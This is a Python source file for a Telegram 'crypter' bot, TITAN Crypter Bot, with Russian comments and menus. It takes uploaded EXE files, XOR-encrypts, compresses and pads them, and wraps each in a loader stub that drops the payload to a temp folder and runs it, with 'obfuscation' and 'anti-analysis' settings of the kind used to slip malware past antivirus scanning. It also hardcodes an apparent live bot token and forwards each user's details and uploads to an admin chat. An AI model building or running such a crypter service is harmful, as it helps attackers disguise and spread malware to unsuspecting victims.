import os
import logging
import telebot
from telebot import types
from telebot.async_telebot import AsyncTeleBot
import asyncio
import threading
from datetime import datetime
import tempfile
import shutil
import random
import zlib
import base64

# Конфигурация бота
BOT_TOKEN = "7645055602:AAH82SESEjhY6EjfoxNCgYew-SiJJbR6oB4"
ADMIN_CHAT_ID = 4922949598

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Упрощенная версия криптера для бота
class SimpleCrypter:
    def __init__(self):
        self.obfuscation_level = 30
        self.anti_analysis_enabled = True
        
    def simple_xor_encrypt(self, data, key):
        """Простое XOR шифрование"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def compress_data(self, data):
        """Сжатие данных"""
        return zlib.compress(data)
    
    def obfuscate_data(self, data):
        """Базовая обфускация"""
        header = os.urandom(random.randint(10, 50))
        footer = os.urandom(random.randint(10, 50))
        return header + data + footer
    
    def create_loader_stub(self, encrypted_data, password):
        """Создание загрузчика"""
        loader_template = f'''
import zlib
import base64
import os
import tempfile
import subprocess
import sys

ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"
PASSWORD = b"{password}"

def decrypt_data(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def main():
    try:
        compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
        original_data = zlib.decompress(compressed_data)
        
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, "temp_executable.exe")
        
        with open(temp_file, "wb") as f:
            f.write(original_data)
        
        subprocess.Popen([temp_file], shell=True)
        
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
'''
        return loader_template
    
    def protect_file(self, input_path, output_path, extension='.exe'):
        """Основная функция защиты файла"""
        try:
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            password = os.urandom(32)
            compressed_data = self.compress_data(original_data)
            encrypted_data = self.simple_xor_encrypt(compressed_data, password)
            
            if self.obfuscation_level > 10:
                encrypted_data = self.obfuscate_data(encrypted_data)
            
            if extension == '.exe':
                loader_code = self.create_loader_stub(encrypted_data, password)
                
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(loader_code)
                
                return True, "Файл защищен успешно"
            else:
                with open(output_path, 'wb') as f:
                    f.write(encrypted_data)
                
                return True, "Файл защищен успешно"
                
        except Exception as e:
            return False, f"Ошибка: {str(e)}"

class TitanCrypterBot:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.user_sessions = {}
        self.crypter = SimpleCrypter()
        self.setup_handlers()
        
    def setup_handlers(self):
        """Настройка обработчиков команд"""
        @self.bot.message_handler(commands=['start'])
        def start_handler(message):
            asyncio.run(self.start(message))
            
        @self.bot.message_handler(commands=['help'])
        def help_handler(message):
            asyncio.run(self.help_command(message))
            
        @self.bot.message_handler(content_types=['document'])
        def document_handler(message):
            asyncio.run(self.handle_document(message))
            
        @self.bot.message_handler(func=lambda message: True)
        def message_handler(message):
            asyncio.run(self.handle_message(message))
            
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback_handler(call):
            asyncio.run(self.button_handler(call))

    async def notify_admin(self, message: str):
        """Отправка уведомления администратору"""
        try:
            await self.bot.send_message(
                ADMIN_CHAT_ID,
                message,
                parse_mode='HTML'
            )
            logger.info("Уведомление отправлено админу")
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления админу: {e}")

    async def start(self, message):
        """Обработка команды /start"""
        try:
            user = message.from_user
            chat_id = message.chat.id
            
            logger.info(f"Новый пользователь: {user.id} - {user.first_name}")
            
            user_info = (
                f"🆕 <b>Новый пользователь</b>\n"
                f"👤 ID: {user.id}\n"
                f"📛 Имя: {user.first_name}\n"
                f"📱 Username: @{user.username if user.username else 'N/A'}\n"
                f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await self.notify_admin(user_info)
            
            self.user_sessions[chat_id] = {
                'step': 'main_menu',
                'file_path': None,
                'user_info': f"{user.first_name} (@{user.username})" if user.username else user.first_name,
                'settings': {
                    'obfuscation_level': 20,
                    'extension': '.exe',
                    'anti_analysis': True
                }
            }
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file"),
                types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
                types.InlineKeyboardButton("❓ Помощь", callback_data="help")
            )
            
            await self.bot.send_message(
                chat_id,
                "🔒 <b>TITAN Crypter Bot</b>\n\n"
                "Профессиональный инструмент для защиты исполняемых файлов\n\n"
                "Выберите действие:",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"Ошибка в start: {e}")
            await self.bot.send_message(message.chat.id, "❌ Произошла ошибка. Попробуйте еще раз.")

    async def help_command(self, message):
        """Команда помощи"""
        help_text = (
            "🤖 <b>TITAN Crypter Bot - Помощь</b>\n\n"
            "📁 <b>Как использовать:</b>\n"
            "1. Нажмите 'Загрузить EXE файл'\n"
            "2. Отправьте EXE файл боту\n"
            "3. Настройте параметры защиты\n"
            "4. Запустите процесс защиты\n\n"
            "⚙️ <b>Настройки:</b>\n"
            "• Уровень обфускации\n"
            "• Расширение выходного файла\n"
            "• Анти-анализ\n\n"
            "⚠️ <b>Внимание:</b> Используйте только для легальных целей!"
        )
        
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🔙 Назад", callback_data="main_menu"))
        
        await self.bot.send_message(message.chat.id, help_text, reply_markup=keyboard, parse_mode='HTML')

    async def handle_document(self, message):
        """Обработка загруженного файла"""
        try:
            chat_id = message.chat.id
            user = message.from_user
            
            if chat_id not in self.user_sessions:
                await self.bot.send_message(chat_id, "❌ Сначала запустите бота командой /start")
                return
                
            document = message.document
            file_name = document.file_name or "unknown.exe"
            
            if not file_name.lower().endswith('.exe'):
                await self.bot.send_message(chat_id, "❌ Поддерживаются только EXE файлы!")
                return
                
            if document.file_size > 20 * 1024 * 1024:
                await self.bot.send_message(chat_id, "❌ Файл слишком большой! Максимальный размер: 20MB")
                return
            
            file_info = await self.bot.get_file(document.file_id)
            temp_dir = tempfile.mkdtemp()
            file_path = os.path.join(temp_dir, file_name)
            
            downloaded_file = await self.bot.download_file(file_info.file_path)
            with open(file_path, 'wb') as f:
                f.write(downloaded_file)
            
            try:
                with open(file_path, 'rb') as f:
                    header = f.read(2)
                    if header != b'MZ':
                        await self.bot.send_message(chat_id, "❌ Это не валидный EXE файл!")
                        shutil.rmtree(temp_dir)
                        return
            except:
                await self.bot.send_message(chat_id, "❌ Ошибка проверки файла!")
                shutil.rmtree(temp_dir)
                return
            
            self.user_sessions[chat_id]['file_path'] = file_path
            self.user_sessions[chat_id]['step'] = 'file_uploaded'
            
            action_info = (
                f"📥 <b>Пользователь загрузил файл</b>\n"
                f"👤 ID: {user.id}\n"
                f"📛 Имя: {user.first_name}\n"
                f"📄 Файл: {file_name}\n"
                f"📏 Размер: {document.file_size} байт\n"
                f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
            )
            await self.notify_admin(action_info)
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("⚙️ Настроить параметры", callback_data="configure"),
                types.InlineKeyboardButton("🔒 Запустить защиту", callback_data="protect"),
                types.InlineKeyboardButton("📁 Загрузить другой файл", callback_data="upload_file"),
                types.InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")
            )
            
            await self.bot.send_message(
                chat_id,
                f"✅ <b>Файл успешно загружен!</b>\n\n"
                f"📄 Имя: {file_name}\n"
                f"📏 Размер: {document.file_size} байт\n\n"
                "Теперь вы можете настроить параметры защиты или сразу запустить процесс:",
                reply_markup=keyboard,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"Ошибка обработки документа: {e}")
            await self.bot.send_message(message.chat.id, "❌ Ошибка при загрузке файла!")

    async def handle_message(self, message):
        """Обработка текстовых сообщений"""
        chat_id = message.chat.id
        text = message.text
        
        if chat_id in self.user_sessions:
            if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
                try:
                    level = int(text)
                    if 1 <= level <= 30:
                        self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                        self.user_sessions[chat_id]['step'] = 'file_uploaded'
                        await self.bot.send_message(chat_id, f"✅ Уровень обфускации установлен: {level}")
                    else:
                        await self.bot.send_message(chat_id, "❌ Введите число от 1 до 30")
                except:
                    await self.bot.send_message(chat_id, "❌ Введите корректное число")

    async def show_settings(self, call):
        """Показать настройки"""
        try:
            chat_id = call.message.chat.id
            if chat_id not in self.user_sessions:
                return
                
            settings = self.user_sessions[chat_id]['settings']
            
            settings_text = (
                "⚙️ <b>Настройки защиты</b>\n\n"
                f"🔢 Уровень обфускации: <b>{settings['obfuscation_level']}/30</b>\n"
                f"📁 Расширение: <b>{settings['extension']}</b>\n"
                f"🔍 Анти-анализ: <b>{'Включено' if settings['anti_analysis'] else 'Выключено'}</b>"
            )
            
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("🔢 Уровень обфускации", callback_data="set_obfuscation"),
                types.InlineKeyboardButton("📁 Расширение", callback_data="set_extension")
            )
            keyboard.add(
                types.InlineKeyboardButton("🔍 Анти-анализ", callback_data="toggle_anti_analysis"),
                types.InlineKeyboardButton("💾 Сохранить", callback_data="save_settings")
            )
            keyboard.add(types.InlineKeyboardButton("🔙 Назад", callback_data="main_menu"))
            
            await self.bot.edit_message_text(
                settings_text,
                chat_id,
                call.message.message_id,
                reply_markup=keyboard,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Ошибка в show_settings: {e}")

    async def process_protection(self, chat_id: int):
        """Обработка защиты файла"""
        try:
            session = self.user_sessions.get(chat_id)
            if not session:
                await self.bot.send_message(chat_id, "❌ Сессия устарела! Начните с /start")
                return
                
            file_path = session.get('file_path')
            
            if not file_path or not os.path.exists(file_path):
                await self.bot.send_message(chat_id, "❌ Файл не найден! Загрузите файл заново.")
                return
            
            settings = session['settings']
            
            self.crypter.obfuscation_level = settings['obfuscation_level']
            self.crypter.anti_analysis_enabled = settings['anti_analysis']
            
            output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
            output_path = os.path.join(tempfile.gettempdir(), output_filename)
            
            progress_messages = [
                "🔄 Проверка файла...",
                "📖 Чтение данных...",
                "🔒 Шифрование...",
                "📦 Сжатие...",
                "🚀 Создание защиты...",
                "✅ Завершение..."
            ]
            
            for i, message in enumerate(progress_messages):
                progress = (i + 1) * 20
                await self.bot.send_message(chat_id, f"{message} ({progress}%)")
                await asyncio.sleep(1)
            
            success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
            
            if success and os.path.exists(output_path):
                file_size = os.path.getsize(output_path)
                
                with open(output_path, 'rb') as f:
                    await self.bot.send_document(
                        chat_id,
                        f,
                        caption=(
                            f"✅ <b>Файл успешно защищен!</b>\n\n"
                            f"📁 Расширение: {settings['extension']}\n"
                            f"🔢 Уровень обфускации: {settings['obfuscation_level']}/30\n"
                            f"📏 Размер: {file_size} байт"
                        ),
                        visible_file_name=output_filename,
                        parse_mode='HTML'
                    )
                
                user_info = session.get('user_info', 'Unknown')
                action_info = (
                    f"🔒 <b>Успешная защита файла</b>\n"
                    f"👤 Пользователь: {user_info}\n"
                    f"👤 ID: {chat_id}\n"
                    f"📄 Файл: {output_filename}\n"
                    f"📏 Размер: {file_size} байт\n"
                    f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
                )
                await self.notify_admin(action_info)
                
            else:
                await self.bot.send_message(chat_id, f"❌ Ошибка: {result_message}")
                
        except Exception as e:
            logger.error(f"Ошибка обработки файла: {e}")
            await self.bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
        finally:
            try:
                session = self.user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    file_dir = os.path.dirname(session['file_path'])
                    if file_dir and os.path.exists(file_dir):
                        shutil.rmtree(file_dir)
            except Exception as e:
                logger.error(f"Ошибка очистки временных файлов: {e}")

    async def button_handler(self, call):
        """Обработчик нажатий на кнопки"""
        try:
            chat_id = call.message.chat.id
            data = call.data
            
            if chat_id not in self.user_sessions:
                self.user_sessions[chat_id] = {
                    'step': 'main_menu', 
                    'settings': {
                        'obfuscation_level': 20,
                        'extension': '.exe',
                        'anti_analysis': True
                    }
                }
            
            if data == "main_menu":
                keyboard = types.InlineKeyboardMarkup()
                keyboard.add(
                    types.InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file"),
                    types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
                    types.InlineKeyboardButton("❓ Помощь", callback_data="help")
                )
                
                await self.bot.edit_message_text(
                    "🔒 <b>TITAN Crypter Bot</b>\n\nВыберите действие:",
                    chat_id,
                    call.message.message_id,
                    reply_markup=keyboard,
                    parse_mode='HTML'
                )
                
            elif data == "upload_file":
                await self.bot.edit_message_text(
                    "📁 <b>Загрузка файла</b>\n\n"
                    "Пожалуйста, отправьте EXE файл как документ:",
                    chat_id,
                    call.message.message_id,
                    parse_mode='HTML'
                )
                
            elif data == "settings":
                await self.show_settings(call)
                
            elif data == "help":
                await self.help_command(call.message)
                
            elif data == "configure":
                await self.show_settings(call)
                
            elif data == "protect":
                if not self.user_sessions[chat_id].get('file_path'):
                    await self.bot.answer_callback_query(call.id, "❌ Сначала загрузите файл!")
                    return
                    
                await self.bot.edit_message_text(
                    "🚀 Запуск защиты...",
                    chat_id,
                    call.message.message_id
                )
                
                await self.process_protection(chat_id)
                
            elif data == "toggle_anti_analysis":
                current = self.user_sessions[chat_id]['settings']['anti_analysis']
                self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
                status = "включен" if not current else "выключен"
                await self.bot.answer_callback_query(call.id, f"✅ Анти-анализ {status}")
                await asyncio.sleep(1)
                await self.show_settings(call)
                
            elif data == "save_settings":
                await self.bot.answer_callback_query(call.id, "✅ Настройки сохранены!")
                
        except Exception as e:
            logger.error(f"Ошибка в button_handler: {e}")

    def run(self):
        """Запуск бота"""
        try:
            logger.info("Бот запускается...")
            print("Titan Crypter Bot запускается...")
            print(f"Токен: {BOT_TOKEN}")
            print(f"Admin ID: {ADMIN_CHAT_ID}")
            
            self.bot.infinity_polling()
            
        except KeyboardInterrupt:
            logger.info("Бот остановлен пользователем")
            print("\nБот остановлен")
        except Exception as e:
            logger.error(f"Критическая ошибка при запуске: {e}")
            print(f"Критическая ошибка: {e}")

if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Установите токен бота!")
        exit(1)
        
    bot = TitanCrypterBot()
    bot.run()
